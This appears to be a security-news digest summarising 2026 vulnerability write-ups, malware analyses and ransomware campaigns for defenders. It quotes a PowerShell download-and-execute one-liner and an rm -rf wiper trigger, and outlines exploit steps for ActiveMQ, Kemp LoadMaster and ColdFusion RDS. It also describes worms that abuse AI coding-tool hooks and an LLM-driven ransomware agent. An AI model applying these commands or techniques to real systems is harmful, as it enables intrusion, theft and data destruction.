item.title: It’s 37oC, And All We Can Think About Is ColdFusion (Adobe ColdFusion Security Bulletin APSB26-68 CVE Bonanza)
item.description:
Adobe ColdFusion APSB26-68 patches 11 CVEs including unauthenticated arbitrary file read/write via the RDS feature, with a trivial path to remote code execution via webshell drop.
Key findings:
- The RDS endpoint at /CFIDE/main/ide.cfm accepts unauthenticated POST requests when RDS is enabled with auth disabled. CVE-2026-48282 (file write) and CVE-2026-48313 (file read) stem from FileServlet passing attacker-supplied paths directly to getFile() with no canonicalization. The patch adds RdsFileSecurity.resolveCanonical() blocking traversal and absolute paths. The write primitive is a one-step webshell drop: POST a CFML shell to the wwwroot and GET it for RCE as the ColdFusion service account.
- CVE-2026-48276 covers a path traversal in the CKEditor file manager upload endpoint at /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm. When uploads are enabled, the endpoint is reachable without authentication and writes attacker-supplied files as NT AUTHORITY\SYSTEM. The patch blocks dangerous extensions (cfm, war, jspf) and adds traversal checks.
- Additional fixes address XSLT SSRF, XXE, and file write in CFML tags including cffile, cffeed, cfimap, and cfwebsocket, though these require attacker-reachable custom pages.
- Affected versions: ColdFusion 2025 Update 9 and below, ColdFusion 2023 Update 20 and below. Patch to 2025 Update 10 or 2023 Update 21 immediately.

item.title: Fake Google and Cloudflare verification pages spread multiple malware families
item.description:
ClickFix campaign active since late 2025 delivers seven malware families via fake Google and Cloudflare verification pages, including a newly documented loader called ResiLoader that kills EDR before dropping StealC.
Key findings:
- The infection chain starts when a victim runs a PowerShell one-liner copied from a fake CAPTCHA or verification page, typically following the pattern: powershell -c "iex(irm '{IP}:{Port}/{Path}' -UseBasicParsing)". The script drops a .ps1 to %Temp% as tmp{4char}.tmp.ps1, creates C:\ProgramData\Zooms, pulls next-stage payloads from Cloudflare R2 buckets or direct IPs hosted on ASN Dedik Services Limited, then beacons to http://{IP}/dl-callback.
- ResiLoader (MD5: 72907d0ca3258365838626f6a8d993a6) arrives as msys-crypto-3.dll via DLL hijacking of ssh-add.exe inside a trojanized Franz app (libEGL.zip from pub-7080e0c20a0e47ca95a476869c532367.r2[.]dev). It drops the legitimate OPSWAT pcdhost.sys driver to terminate 140+ EDR/AV processes (BYOD technique), bypasses UAC via ICMLuaUtil, persists via HKLM/HKCU Run key pointing to C:\ProgramData\Google Update\ssh-add.exe, then process-hollows ServiceModelReg.exe to run StealC (MD5: 0234E3188F2883A438B3F2BEAB7A78B2) with C2 at 146.19.248[.]120.
- Additional payloads include Amatera Stealer (C2: xzz.proxygrid[.]cc), Remus, NetSupport RAT, CastleLoader, and a Rust-based stealer (C2: popularcard[.]shop). The Franz loader C2 is completstep[.]com.

item.title: Inside Elastic InfoSec's agentic SOC: cutting alert triage from 30 minutes to under 3
item.description:
Elastic 🇮🇷 InfoSec built a fully native agentic SOC pipeline that cuts alert triage from 30 minutes to under 3, using deterministic ES|QL queries plus specialized AI agents, all inside Kibana with no third-party orchestrator.
Key findings:
- The pipeline has four stages: a deterministic ES|QL triage layer closes obvious false positives at zero token cost, an Initial Triage agent renders a structured verdict at roughly 50k tokens, domain-specific Specialized agents (macOS, Windows, Linux, AWS, Okta, Azure, GCP, SaaS) each write factual forensic findings to a Kibana case, and a Final Review agent synthesizes everything into a verdict with recommended actions. A broad general-purpose agent can burn 500k tokens per run; keeping the Initial Triage agent narrow holds it to 50k, a 10x cost difference that compounds fast at 10,000 alerts per month.
- Routing is driven by ECS fields: agent.type and host.os.type dispatch endpoint alerts, event.dataset dispatches cloud and SaaS alerts. Only relevant agents fire. A macOS alert never touches the GCP agent, cutting unnecessary token spend structurally, not by configuration tuning.
- The Specialized agents are fact-finders only. Verdict language is explicitly prohibited in their prompts; the Final Review agent holds the sole assessment authority. This separation prevents one domain's interpretation from biasing the final call, a design choice with direct implications for audit trails and analyst review.

item.title: Vect and TeamPCP partner for ransomware campaigns
item.description:
Vect RaaS and TeamPCP formalize a supply chain-to-ransomware pipeline: credential theft across open-source tooling feeds industrialized extortion across 1,000+ SaaS environments.
Key details:
- TeamPCP (also known as PCPcat, ShellForce, DeadCatx3) exploited CVE-2025-55182 (CVSS 10.0), a pre-auth RCE in React Server Components, then pivoted to supply chain attacks on Trivy, Checkmarx KICS and AST GitHub Actions, LiteLLM (versions 1.82.7 and 1.82.8), and Telnyx Python SDK (versions 4.87.1 and 4.87.2). CanisterWorm propagated the compromise across 48+ npm packages. Outbound port 666 is a network signature from the earlier worm phase.
- The credential harvest was massive: roughly 300 GB of compressed data and an estimated 500,000 credential sets exfiltrated, including cloud credentials, GitHub tokens, and Bitwarden CLI secrets. Exfil used a domain mimicking Checkmarx infrastructure; fallback was a hidden repository created inside the victim's own GitHub org.
- Vect, a RaaS operation active since December 2025, claimed 154 victims within two months. A confirmed flaw causes files larger than 128 KB to be permanently destroyed rather than encrypted, making ransom payment potentially irreversible data loss.
- Lapsus$ claimed Checkmarx on its leak site. TeamPCP previously ran CipherForce, which listed six victims before rebranding in May 2026.

item.title: Rule Fixes & Tuning Tips #20260629
item.description:
Nine detection engineering tuning insights from community rule repos: false positive reduction, cloud ingestion gaps, BYOVD blocklist freshness, and email NLP coverage all addressed in one digest.
Key findings:
- Network rules gained private-to-public IP scoping on SMTP and IPSEC, and the NAT-T rule now requires both source and destination port equal 4500, eliminating false positives from ephemeral port collisions. pfSense and Corelight indices were added, with explicit exclusions for block and denied actions to prevent dropped connections appearing as active sessions.
- Google Workspace rules shifted lookback windows from 9 to 130 minutes and set timestamp_override to event.ingested, closing false-negative gaps caused by cloud log ingestion lag. Alert suppression on user.email plus source.ip consolidates multi-event bursts from single admin changes.
- Email rules now gate domain exemptions on coalesce(headers.auth_summary.dmarc.pass, false), so brand impersonation bypasses via spoofed high-trust domains lose their exception. Google Drive impersonation logic adds a WHOIS domain-age check under 365 days. BEC rules gained NLP classifier checks on body text and raw HTML title elements.
- BYOVD driver blocklists were synchronized with the LOLDrivers repository, deprecating stale hashes and adding new vulnerable and malicious driver signatures.

item.title: PamStealer: a Rust-based macOS infostealer that validates credentials through PAM
item.description:
PamStealer, a Rust-based macOS 🍎 infostealer disguised as the Maccy clipboard manager, uses PAM to silently validate stolen credentials before exfiltrating browser data, keychain secrets, and clipboard contents.
Key findings:
- Stage 1 drops a trojanized Maccy app bundle. The malicious payload is a Rust binary embedded inside a legitimate-looking .app, making static detection harder since Rust binaries strip cleanly and carry little metadata for signature-based tools to anchor on.
- Stage 2 abuses the PAM (Pluggable Authentication Modules) framework to verify harvested credentials in real time before exfil, a technique that confirms credential validity on the victim machine without touching an external service and reducing noise.
- Targets include browser-stored credentials, clipboard contents, and macOS keychain data, giving the attacker a broad credential harvest from a single execution.
- The disguise as Maccy, a popular open-source clipboard utility, suggests delivery via trojanized downloads or typosquatting, targeting macOS users who actively seek clipboard tools.
DFIR takeaway: on macOS endpoints, examine LaunchAgents and LaunchDaemons for unsigned or recently added entries, and check for unexpected PAM API calls in unified logs via log show filtering on pam_authenticate. Verify Maccy installations against the official binary hash. Full IOCs and analysis in the Jamf report.

item.title: Chaining an Apache ActiveMQ RCE on a Fully Patched 6.2.5 (CVE-2026-34197)
item.description:
CVE-2026-34197: A two-bug chain achieves post-auth RCE on fully patched Apache ActiveMQ Classic 6.2.5 on Windows, bypassing both the URI validator and the XBean protocol allowlist with a single Jolokia call.
- CVE-2026-34197 is a post-auth RCE via the Jolokia endpoint: an authenticated call to BrokerView.addNetworkConnector with a vm:// URI carrying a brokerConfig=xbean: parameter causes the broker to load attacker-controlled Spring XML and instantiate a ProcessBuilder bean. The 6.2.5 patch added a deny-list validator and locked XBeanBrokerFactory to file,classpath protocols. Both controls fail.
- Bug 1 (validator bypass): validateAllowedUri only recurses into composite URI components when isCompositeURI returns true, which requires the scheme-specific part to start with "(". Prefixing the payload with bare static: (no parens) passes the outer scheme check and skips recursion entirely, so the inner vm:// is never inspected.
- Bug 2 (allowlist bypass): The allowlist blocks file:// as a remote path, but the classifier uses raw String.startsWith on the undecoded URI. Percent-encoding the slashes (file:%2525252f%2525252f...) makes the classifier see a plain local file: scheme while the JDK decodes it back to file://HOST/SHARE at open time. On Windows this resolves as a UNC path; with 445/TCP closed on the attacker side, the Windows WebDAV redirector (WebClient service) fetches the payload over HTTP, no credentials needed.

item.title: Missed incidents, persistent threats, and response gaps: Insights from compromise assessment projects
item.description:
Kaspersky's 2025 compromise assessment data reveals a systemic detection failure: 60% of incidents were missed entirely by existing tools, 52% of high-severity compromises went undetected for over 90 days, and one incident had persisted for four years.
Key findings:
- Dwell time drives severity. Incidents detected within 30 days show balanced severity distribution. By 60-90 days, 71% are high-severity. Beyond 90 days, 52% are still high-severity. The four-year case involved NSABuffMiner crypto-mining on domain controllers via EternalBlue (MS17-010), with malicious files hidden in C:\Windows\Fonts\Mysql and persistence via services named MicrosoftMysql and MicrosoftFonts, plus scheduled tasks At1 and At2.
- Post-IR checkups produced the highest proportion of high-severity findings (40.7%), exposing what contained IR misses. One case found a cron job re-downloading a PHP web shell from GitHub, a live bash reverse shell running as the apache user, a ClipBanker variant persisting under HKU\...\Run\9Er6IIp, and a WMI event consumer aliasing Invoke-Expression as "Kaspersky."
- 40% of discovered web shells lived in backups. Asset inventory gaps (25% of engagements) meant cloud Linux servers outside AD never got scanned, and backup restores reintroduced the threat repeatedly.
- Without 24/7 monitoring or threat hunting, 84-86% of incidents were medium or high severity.

item.title: FortiBleed: Inside the Campaign That Cracked 75,000 Fortinet Firewalls
item.description:
FortiBleed: verified admin and SSL VPN credentials for ~75,000 internet-facing FortiGate firewalls leaked across 194 countries, with no CVE and no patch available.
Key findings:
- No vulnerability to patch here. FortiBleed stems from stolen device configs, credential reuse, and offline cracking of legacy SHA-256 password hashes. FortiGate management interfaces exposed to the internet were the entry point, and the weak hashing did the rest.
- PBKDF2 stronger hashing only activates after each admin re-authenticates. Devices where admins have not logged in since the upgrade still store crackable SHA-256 hashes, meaning the exposure persists silently on patched devices.
- IT services and telecoms are hit hardest, but affected orgs span every sector across 194 countries. Scale matters here: 75,000 firewalls with working credentials is a ready-made access broker inventory.
- No CVE means no patch Tuesday trigger and no automatic alerting. Defenders must act without a traditional vulnerability remediation workflow.
Takeaway: pull your FortiGate management interface off the internet now, force all admins to re-authenticate to trigger PBKDF2 re-hashing, and enable MFA on all admin and VPN accounts. Hunt for any management interface still internet-exposed using your asset inventory and verify FortiOS is current.

item.title: RustDuck: The Botnet That’s Still Small but Engineering Like It Plans to Grow
item.description:
RustDuck botnet targets IoT and servers with Rust-rewritten malware, layered C2 encryption, and a weighted anti-sandbox scoring system, signaling rapid capability growth from a still-small but technically ambitious operation tracked since February 2026.
Key details:
- Entry points span default Telnet/SSH creds, Android ADB, DVRs from TVT, routers from Ruijie, TP-Link, ZTE, plus ThinkPHP, Jenkins, and Hadoop YARN. CVEs include CVE-2025-29635 (CISA KEV, D-Link DIR-823X command injection, no patch, retire it), CVE-2017-17215 (Huawei HG532 RCE, Mirai-era), CVE-2024-1781 (Totolink X6000R, unpatched), and CVE-2018-8007 (Apache CouchDB admin RCE).
- The loader chain has cycled through four encryption schemes: LCG+XOR+LZ4, Xoshiro128 with hardcoded constants, XOR with a fixed magic string, and now ChaCha20. Each iteration was a direct response to analyst detection, not coincidence.
- Anti-analysis scoring assigns 100 points each for detecting Wireshark, gdb, or Frida in the process list, a debugger in /proc/self/status, or a tampered file checksum; 50 for Cowrie/Dionaea honeypot files; 35 for a response from 192.0.2.1. A dual-clock timing check catches sandboxes that accelerate execution. Exceed the threshold and the malware self-erases.
- C2 uses ChaCha20-Poly1305 with Curve25519 key exchange and HKDF-SHA256 derivation, keys rotating every 10 minutes, then switches to AES-GCM with split up/down keys. A three-byte header mimics TLS records.

item.title: Hack Smarter — City Council (Active Directory)
item.description:
A public service request app leaks a service account name in its own logs, triggering a full AD domain compromise through six chained techniques across city.local.
Key findings:
- Initial foothold came from running the downloadable citizen portal app locally and reading its debug log, which printed "Using dedicated service account: svc_services_portal" in plaintext. Wireshark on the local loopback then captured the cleartext LDAP bind password, validating credentials against DC-CC.city[.]local (10.1.65[.]124, Windows Server 2019 Build 17763).
- BloodHound enumeration pivoted through Kerberoasting (clerk.john via impacket-GetUserSPNs), NTLM coercion via a malicious .lnk dropped on a writable SMB share to capture jon.peters NTLMv2, and targeted Kerberoasting via GenericWrite on three accounts (T1558.003, T1187).
- Credential recovery from a WIM profile backup exposed emma.hayes plaintext creds stored in PowerShell history (ConsoleHost_history.txt) as a cmdkey command, a classic artifact defenders routinely miss.
- emma.hayes WriteDacl on CityOps OU escalated to GenericAll, enabling account re-enabling and password reset of sam.brooks (Remote Management Users) for WinRM access, then web_admin for IIS write access.
- SeImpersonatePrivilege on the DefaultAppPool identity was abused with EfsPotato (CVE-2021-36942 bypass) to land NT AUTHORITY\SYSTEM.

item.title: Azure CLI Targeted in LSHIY Password Spray Campaign Across 64 Orgs
item.description:
An ongoing password spray campaign abusing Azure CLI's OAuth ROPC flow has compromised 78 accounts across 64 orgs in 14 days, defeating MFA at 15 of 23 businesses hit on a single day.
Key findings:
- 81 million login attempts since June 12, 2026, sourced almost entirely from IPv6 range 2a0a:d683[.]/32, tied to LSHIY LLC (AS32167/AS955), with third parties linking both ASNs to Chinese 🇨🇳 infrastructure. LSHIY lists addresses in Hong Kong 🇭🇰 and Wuhan alongside a New York 🇺🇸 shared office.
- Attack method: threat actors replay breach-dump credentials against the OAuth 2.0 ROPC /token endpoint. Because ROPC sends credentials directly and never hits the authorization endpoint, Conditional Access Policies enforcing MFA do not fire, making it an effective MFA bypass.
- 15 of 23 companies hit on June 22 had MFA via CAP and were still compromised. Root causes: MFA scoped to admin portals only, trusted-location rules that the attackers' inconsistently geolocated IPs bypassed, and two orgs running CAP in report-only mode.
- Huntress reports credential spray volume across its customer base has grown 155x in six months, averaging roughly 1,964 failed attempts per protected tenant per month.
Remediation: scope your Conditional Access Policy to all users, all cloud apps, all client app types. Enable userStrongAuthClientAuthNRequired to block ROPC outright. On detection, triage by credential validity rather than raw spray volume.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2072470968887333039

item.title: CVE-2026-48558: SimpleHelp OIDC Auth Bypass Used to Deploy Infostealer Payloads
item.description:
CVE-2026-48558 in SimpleHelp allows unauthenticated attackers to forge OIDC tokens, seize technician sessions, and deploy Djinn Stealer across managed endpoints. CISA KEV-listed with a July 2 remediation deadline.
Key findings:
- CVE-2026-48558 is a cryptographic signature validation failure in SimpleHelp's OIDC login flow. The server accepts forged identity tokens without verifying the signature, handing an unauthenticated attacker a full technician session. Affected versions: 5.5.1 through 5.5.15 and 6.0 pre-release builds before 6.0 RC2. Fix: upgrade to 5.5.16+ or 6.0 RC2+.
- Exploitation is conditional: you are only exposed if OIDC is enabled AND Technician Groups are configured with "Allow group authenticated logins." If OIDC is off entirely, this bypass does not apply.
- Active exploitation delivers TaskWeaver, an obfuscated Node.js loader masquerading as jquery.js and executed as "node.exe jquery.js", followed by Djinn Stealer, a cross-platform infostealer targeting Windows, macOS, and Linux. Targets include browser credentials, SSH keys, cloud tokens, and developer secrets.
- In MSP environments, one compromised technician session is a pivot point into every downstream customer. The blast radius is not one host; it is the entire managed estate.

item.title: Operationalizing VMRay UniqueSignal in MISP for detection, hunting and blocking
item.description:
VMRay UniqueSignal plus MISP gives SOC and CSIRT teams a repeatable pipeline to route curated threat intel into Sentinel, Defender, and firewall blocklists without flooding analysts with stale noise.
Key details:
- Tag every VMRay feed event at the source with curation:community="VMRay" and admiralty-scale:source-reliability="a" in MISP feed config. These two tags become the filter anchor for every downstream integration, from MISP2Sentinel to REST API exports, so skipping them breaks the whole pipeline.
- MISP warninglists are the first quality gate: they flag VPN ranges, CDN addresses, and shared infrastructure before anything reaches a blocking control. Maintain a local warninglist covering internal IPs, hostnames, and partner infrastructure to prevent self-inflicted false positives.
- Split destinations by risk: MISP2Sentinel accepts a broader published+workflow:complete set on a 12-hour sync for detection and hunting. MISP2Defender applies a tighter filter, only forwarding indicators tagged confidence VMRay UniqueSignal - Unlimited: 100.00 or 80.00, with defender_action="Block".
- Offline-tagged or aged indicators are retro-hunt candidates, not blocklist candidates. Bundle them in MISP Collections with relevant galaxy clusters and run a workflow to push them to your SIEM for historical log review.

item.title: BTS #77 - FortiBleed Uncovered: How Attackers Harvest Credentials from Fortinet Devices
item.description:
FortiBleed: a credential-harvesting and access-brokering campaign compromised roughly 73,000-86,000 internet-facing FortiGate firewalls, roughly 50% of all exposed devices, attributed to a Russian-speaking IAB group Unit 42 dubbed SantaAd.
- FortiBleed is not a single CVE. It chains CVE-2018-13379 credential dumps, the Belsen Group's 15,000 FortiGate config-file leak, infostealer logs, and brute-forced password hashes into one industrial-scale operation. No malware touched FortiOS directly: attackers lived off the land using stolen and backdoor credentials plus the built-in FortiOS packet-sniffer command across 24 protocols.
- FortiOS stored legacy AK1 (SHA-1) and SH2 (SHA-256) hashes alongside newer PBKDF2 hashes. When upgraded, the old hash was silently preserved in full config backups as an "old password" field for downgrade compatibility but hidden from a standard show config. Attackers rented 40-GPU Hashopolis clusters to crack those SHA-256 hashes at scale.
- FortiGate Sniffer acted as an orchestrator: once one device was owned, attackers deployed passive sniffing to every device they accessed, collecting credentials from crossing traffic, not just FortiOS accounts. Victim metadata was enriched via SSL certificate org fields, then sorted by industry and revenue for IAB resale.
- DFIR gap: network appliances sit outside EDR, and config-backup access requires super-admin credentials.

item.title: Browser-Only Ransomware: From LLM Hallucinations to a Practical Attack Technique
item.description:
DeepSeek-attributed sample reveals a browser-native ransomware technique abusing the File System Access API, requiring no binary, no APK, and no exploit. Android photo directories are the high-value target.
Key findings:
- The DeepSeek-attributed sample (SHA256: 07c39f79ab92fb21557b82283472dce1c112f577d796111fb752c3c6d84c86b5), dubbed InfernoGrabber v9.0, is a Python Flask app serving a fake Discord avatar upscaler. The browser-side JavaScript calls showDirectoryPicker() and showOpenFilePicker() via the File System Access API to enumerate, read, exfiltrate, and overwrite local files, then displays a ransom overlay. No native payload, root access, or CVE needed.
- Attack surface is Chromium-family browsers only. The API shipped desktop Chrome 86; Chrome 132 extended it to Android. Firefox and Safari do not expose the directory picker. On Android, DCIM/Pictures selection is unrestricted, making the photo library, often containing identity docs, recovery codes, and banking screenshots, directly reachable after a single "Allow" click.
- The social-engineering lure is a fake AI image-enhancer. The permission prompt ("this site can edit files in the selected folder") feels expected in that context, removing the cognitive friction that normally flags a malicious action. No binary download occurs, so traditional endpoint controls do not fire.

item.title: From CitrixBleed 2 to Cloudflared: The Tools and Techniques Behind Anubis Ransomware Attacks
item.description:
Anubis ransomware affiliates are exploiting CitrixBleed 2 (CVE-2025-5777) and abusing legitimate RMM tools plus Cloudflared tunnels to blend into target environments across 2026 intrusions.
Key findings:
- Initial access comes via two paths: stolen VPN credentials and exploitation of CVE-2025-5777 (CitrixBleed 2), making perimeter device telemetry a priority artifact to pull early in any Anubis investigation.
- Post-access, affiliates rely on legitimate RMM tools for persistence and lateral movement, a classic living-off-the-land pattern (T1219) that lets malicious sessions hide inside expected remote management traffic.
- Cloudflared tunnels are used to establish covert C2 channels, routing traffic through Cloudflare's infrastructure to avoid egress-based detection and bypass firewall rules that would flag unknown C2 domains.
- Despite affiliate variation in TTPs, the consistent thread is abuse of trusted tooling: RMM software and tunnel utilities leave process creation, network connection, and service installation artifacts that endpoint telemetry should capture.
Takeaway: Pull Citrix ADC session logs for CVE-2025-5777 exploitation evidence, then hunt process trees for Cloudflared spawning from unexpected parents. Flag any RMM binary not in your approved software inventory making outbound connections. Perimeter and EDR telemetry correlation is the key to breaking this chain early.

item.title: Anatomy of an Attack: VIPERTUNNEL
item.description:
Russian 🇷🇺 EvilCorp-linked VIPERTUNNEL backdoor deployed ahead of DragonForce ransomware, using Python LOLBAS techniques and triple-layer obfuscation to tunnel attacker traffic through victim networks.
- UNC2165 (EvilCorp) operators plant VIPERTUNNEL post-compromise, likely after SocGholish/FAKEUPDATES initial access (T1204, T1189). A scheduled task named "523135538" launches pythonw.exe from C:\ProgramData\cp49s\ with no arguments (T1053.005, T1036), while a malicious sitecustomize.py auto-executes on every Python startup, loading b5yogiiy3c.dll, a Python script masquerading as a PE binary (T1036.008).
- The payload never touches disk in final form. Three obfuscation layers (T1027) including Base85, zlib, AES, and ChaCha20 (T1027.013) decrypt a high-entropy blob directly into memory (T1027.009), leaving no static signature for endpoint tools to scan.
- Once in memory, VIPERTUNNEL opens an outbound SOCKS5 tunnel (T1090) to a hardcoded C2 over TCP 443 (T1071.001). Traffic does not resemble HTTPS. Infrastructure analysis revealed Pyramid C2 framework responses with a modified WWW-Authenticate header: Basic realm="Proxy".
- Detection takeaway: no single signal is conclusive. Correlate Event ID 4698 (scheduled task created) involving pythonw.exe from non-standard paths, Python processes with no command-line arguments, .dll files that are plaintext Python scripts, and outbound TCP 443 sessions with SOCKS-like behavior to rare external hosts.

item.title: JADEPUFFER: Agentic ransomware for automated database extortion
item.description:
First documented agentic ransomware: JADEPUFFER ran a fully automated database extortion operation end-to-end via LLM, exploiting CVE-2025-3248 in Langflow to pivot and destroy 1,342 Nacos configs.
- CVE-2025-3248 is an unauthenticated RCE in Langflow's code-validation endpoint. JADEPUFFER sent all payloads as Base64-encoded Python through it, then pivoted from the Langflow host to a production MySQL/Nacos server using harvested credentials. Phase 1 swept for LLM API keys, cloud credentials including Chinese 🇨🇳 provider prefixes (ALIBABA_, ALIYUN_, TENCENT_), MinIO buckets at 127.0.0.1:9000 with default creds, and dumped Langflow's own Postgres DB.
- The agent exploited Nacos via CVE-2021-29441 auth-bypass, forged JWTs using the well-known default signing key, and injected a backdoor admin (xadmin) directly into the backing MySQL DB. When the first login failed, a corrective 15-line payload followed in 31 seconds: delete, diagnose, rebuild, reinsert. No human touched it.
- Ransomware phase used MySQL AES_ENCRYPT() to encrypt all 1,342 config rows, dropped config_info and his_config_info, then created extortion table README_RANSOM with Bitcoin address 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy and contact e78393397[@]proton[.]me. The AES key was ephemeral, printed to stdout and never stored. Recovery is impossible even with payment.

item.title: AI Security Incident Case: Miasma Worm Attacked Microsoft GitHub
item.description:
The Miasma worm, operated by TeamPCP, disabled 73 Microsoft GitHub repositories in 105 seconds by weaponizing AI coding tools as autonomous payload executors, no CVE required.
Key details:
- Attack chain: commit 5f456b8 to Azure/durabletask added .github/setup.js (4.6 MB obfuscated credential stealer) plus four config files targeting Claude Code (SessionStart hook), Gemini CLI (identical hook), Cursor (alwaysApply prompt injection), and VS Code (runOn: folderOpen). Opening the folder triggers execution before any install step runs.
- The payload downloads the Bun runtime, then exfiltrates GitHub/npm tokens, AWS/Azure/GCP keys, SSH keys, Kubeconfig, Docker configs, browser data, and shell history. C2 runs entirely over GitHub Commit Search APIs, invisible to network-layer detection.
- Evasion was deliberate: commit message claimed a DataConverter edit with no source changes, timestamp backdated to 2020, [skip ci] flag added to block pipeline scanning. Compromised contributor credentials from a PyPI poisoning on May 19 were reused 17 days later, unrotated.
- Dead man's switch: a decoy token named IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner triggers rm -rf ~/ if revoked, punishing incident responders who move too fast.
Takeaway: audit every repo for .claude/settings.json, .gemini/settings.json, .cursor/rules/*.mdc, and .vscode/tasks.json. Rotate all tokens for any environment that touched affected repos.

item.title: RustDuck: 双阶段僵尸网络深度剖析
item.description:
RustDuck botnet, active since Feb 2026, couples a two-stage Loader+Core architecture with Rust-rewritten payloads and layered anti-analysis to build a cross-platform DDoS platform evolving faster than most defenders track.
- The Loader embeds compressed, encrypted Core payload as an ELF overlay. Loader SHA1s: 8315f650, 6aa791c7, 4d11bd49, d39a3ee9.
- Initial access spans weak-credential brute-force over Telnet/SSH plus RCE against Android ADB, TVT API, Ruijie, TP-Link, ZTE devices and ThinkPHP, Jenkins, YARN web components. CVEs exploited include CVE-2025-29635, CVE-2017-17215, CVE-2018-8007, and CVE-2024-1781. Most active delivery IP: 176.65.139[.]204.
- The Core module runs a weighted anti-analysis gauntlet scoring 10 detection checks: process-list scan for wireshark, tcpdump, gdb, ida, frida (weight 100 each); TracerPid check via /proc/self/status; Frida/ASAN library scan via /proc/self/maps; SHA256 integrity check of its own file; cowrie/dionaea honeypot file checks; environment variable keyword scan; 192.0.2.1 network blackhole probe; dual-clock time-travel check; DMI/SCSI virtualization string check; and VM MAC OUI check.

item.title: CitrixBleed To Infinity And Beyond (Citrix NetScaler Pre-Auth Memory Overread CVE-2026-8451)
item.description:
CVE-2026-8451 (CVSS 8.8): Citrix NetScaler's custom SAML XML parser reads past its input buffer, leaking process memory into the NSC_TASS cookie with no authentication required. NetScaler configured as a SAML IDP is the attack surface.
- CVE-2026-8451, CVSS 8.8, affects NetScaler ADC and Gateway 14.1 before 14.1-72.61 and 13.1 before 13.1-63.18, plus FIPS variants. The root cause is a hand-rolled XML attribute parser with no bounds checks: unquoted attribute values are terminated only by null, closing angle bracket, or matching quote, not by newline. A crafted AuthnRequest with a newline-terminated AssertionConsumerServiceURL causes the parser to consume data well past the attribute boundary.
- The overread data surfaces directly in the NSC_TASS cookie returned in the HTTP 302 response, base64-encoded. Watchtowr confirmed leaked bytes include what appears to be a valid heap pointer (0xa10ca7ed), meaning this is not just an infoleak but a potential ASLR-bypass primitive if paired with a memory corruption bug. A single malformed request can also crash the nsppe process, giving a pre-auth DoS primitive.
- Detection artifact: POST requests to /saml/login with a SAMLRequest parameter containing base64-encoded XML where AssertionConsumerServiceURL or ID attributes lack a closing quote and are followed by a newline. Look for anomalous NSC_TASS cookie values containing binary garbage or non-ASCII sequences in your NetScaler access logs at /var/log/ns.log.

item.title: Enterprise Tech In, Shell Out (Progress Kemp LoadMaster Uninitialized Heap to Pre-Auth RCE CVE-2026-8037)
item.description:
CVE-2026-8037: Pre-auth RCE in Progress Kemp LoadMaster via uninitialized heap memory in the API credential handler, affecting GA v7.2.63.1 and older, LTSF v7.2.54.17 and older.
- The root cause is a two-bug chain in the access binary's escape_quotes() function: it used malloc() instead of calloc(), and never wrote a null terminator after the escaped output. When apiuser contained no single quote, the original pointer was returned unchanged. When it did, a heap buffer was allocated, filled with escaped content, and returned without termination, leaving __sprintf_chk() free to read past the buffer boundary into adjacent heap memory.
- Exploitation is heap-grooming, not classic injection. An unauthenticated POST to /accessv2 sends four single quotes in apiuser, expanding to 16 escaped bytes that overwrite the tcache fd and key metadata of the adjacent freed chunk, clearing the null bytes that would stop the read. Dozens of spray keys (g0 through g60) pre-load the command payload into freed chunks nearby. __sprintf_chk() then reads across the unterminated buffer into the sprayed data, injecting arbitrary shell commands into the validuser system() call.
- The patch is two lines: malloc becomes calloc (zero-fills the buffer), and a null terminator is written after the escaped output via a new end pointer. Either fix alone would have broken the exploit chain.
- Affected systems are edge-facing load balancers with the API enabled.

item.title: ToddyCat: your hidden email assistant. Part 2
item.description:

item.title: Forensic tools as instruments of repression: Russia, Cellebrite, and the case of Andrey Pivovarov
item.description:
Citizen Lab forensically confirmed Cellebrite's UFED was used to extract Andrey Pivovarov's iPhone 12 while in Russian 🇷🇺 custody in 2021, three months after Cellebrite cancelled its Russian 🇷🇺 contracts. The hardware kept working anyway.
- MobileLockdown USB connection logs on Pivovarov's iPhone carried Host ID 9016926980658937761372207, previously attributed to Cellebrite hardware by Citizen Lab. Unusually, the Russian 🇷🇺 MVD's own Forensic Expert Report No. 1269-17 corroborated this, explicitly naming UFED Physical Analyzer and UFED 4PC as the tools used, and documenting searches of WhatsApp, Telegram, and Viber for political terms including Mikhail Khodorkovsky and human rights lawyer Anastasiya Burakova.
- Cellebrite's offline mode is the structural failure here. Contract cancellation does not equal access termination. The UFED continued functioning without license validation, and Citizen Lab has now documented this pattern in Serbia, Jordan, Kenya, and Russia 🇷🇺.
- Pivovarov's MacBook, protected by full-disk encryption, was not accessed. The MVD report itself documents the failure, including what appear to be failed login attempts. A timestamp logged as June 17, 2021 was assessed as a November 2024 login after the battery-drained device reset its clock to 1970.
- The Burakova connection matters operationally. Data extracted from Pivovarov's phone likely contributed to target identification for COLDRIVER FSB-linked hacking operations documented in 2024.

item.title: New FBI Alert: Russian Intelligence Uses Signal Recovery Keys to Access Messages
item.description:
Russian 🇷🇺 FSB-linked groups UNC5792 and UNC4221 have shifted Signal phishing campaigns from stealing verification codes to harvesting Backup Recovery Keys, enabling full message archive access and persistent account takeover.
Key findings:
- The original March 2026 campaign tricked targets into sharing SMS codes, PINs, or clicking doctored group-invite links to silently link an attacker device. The June update reveals the evolved tactic: fake in-app messages impersonating Signal support walk targets step by step through enabling backups and pasting their Recovery Key into the chat. Two lure templates are documented: a fake mandatory 2FA rollout and an urgent data-loss warning.
- A stolen Recovery Key is not session-scoped. It decrypts the entire message archive, past and future, and remains valid even if the victim creates a new account on the same phone number. The only remediation is generating a fresh key in Settings, which invalidates the old one going forward but does not claw back any backup already downloaded.
- Targets are deliberate: government officials, military personnel, journalists, and Ukrainian 🇺🇦 officials. The same tradecraft has since been observed against WhatsApp and Telegram. The State Department is offering up to $10 million for information on UNC5792.
- Signal's encryption and application are uncompromised. This is purely a social-engineering attack against a legitimate backup feature.

item.title: Understanding Langflow CVE-2026-55255, and why higher CVSS vulnerabilities aren't always the most exploited
item.description:
First wild exploitation of Langflow CVE-2026-55255 (CVSS 9.9 IDOR) observed June 25, 2026, alongside the already-KEV-listed CVE-2026-33017 (CVSS 9.3 RCE), exposing why higher scores do not equal higher exploitation rates.
Key findings:
- A single operator at 45.207.216[.]55 ran both CVEs against the same Langflow instance. CVE-2026-33017 is an unauthenticated RCE in CISA KEV since March 25, 2026, exploited across roughly 7,000 servers within 20 hours of disclosure. CVE-2026-55255 is a cross-tenant IDOR requiring authentication and a pre-harvested flow UUID; this is its first documented in-the-wild use.
